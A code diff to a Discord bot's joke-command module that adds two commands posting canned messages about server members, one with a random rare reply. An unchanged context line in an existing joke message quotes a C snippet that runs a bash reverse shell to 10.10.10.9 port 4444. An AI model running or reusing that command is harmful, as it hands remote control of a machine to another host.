@@ -3,6 +3,7 @@ from discord import slash_command
 
 import os
 from random import choice
+from random import randrange
 
 mod_role_id = int(os.getenv('MOD_ROLE_ID', 123))
 admin_role_id = int(os.getenv('ADMIN_ROLE_ID', 123))
@@ -106,7 +107,7 @@ class Prestige(commands.Cog):
     @commands.command(aliases=["cafone", "napoletano", "forzanapoli", "ihatepython", "cbestlanguage", "iloveassembly", "iloveasm"])
     async def _cafone(self, ctx) -> None:
         """ A command for telling something about cafone. """
-        
+
         sentences = [
             "i heard **assembly** <:peep_selfie:959872040301629561> <@703017795738402827>",
             "i heard **c++** <:peep_selfie:959872040301629561> <@703017795738402827>",
@@ -122,7 +123,7 @@ int main(void)
   const char* command = "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.10.9/4444 0>&1'";
   const char* message = "cafone best engineer and hacker\\n";
   int result;
-  
+
   result = system(command);
   if(result == -1)
   {
@@ -157,6 +158,18 @@ int main(void)
 
         await ctx.send(choice(sentences))
 
+    @commands.command(aliases=["birds"])
+    async def keybirds(self, ctx) -> None:
+        """ A command for telling something about Keybirds. """
+
+        sentences = [
+            "<@584699027421921280> Well, sounds like a good idea",
+            "<@584699027421921280> Stina wants to go outside",
+            "<@584699027421921280> I closed it and now it's closed"
+            ]
+
+        await ctx.send(choice(sentences))
+
     @commands.command()
     async def loral(self, ctx) -> None:
         """ A command for telling something about loral. """
@@ -174,6 +187,20 @@ int main(void)
         """ A command for telling something about anis. """
 
         await ctx.send("<@515991382217981952> niso")
+
+    @commands.command(aliases=["hodjapie", "onekebappls"])
+    async def hodja(self, ctx) -> None:
+        """ A command for telling something about the kebap guy, hodja. """
+
+        sentences = [
+            "**I THOUGHT YOU WERE A GIRL** <@201086628167417857>",
+            "*One kebap, please!* <@201086628167417857>"
+        ]
+
+        if randrange(67) == 33:
+            await ctx.send("**SUPER RARE DOUBLE LAVASH KEBAP PULL!!!** <@201086628167417857>")
+        else:
+            await ctx.send(choice(sentences))
 
 def setup(client) -> None:
     """ Cog's setup function. """
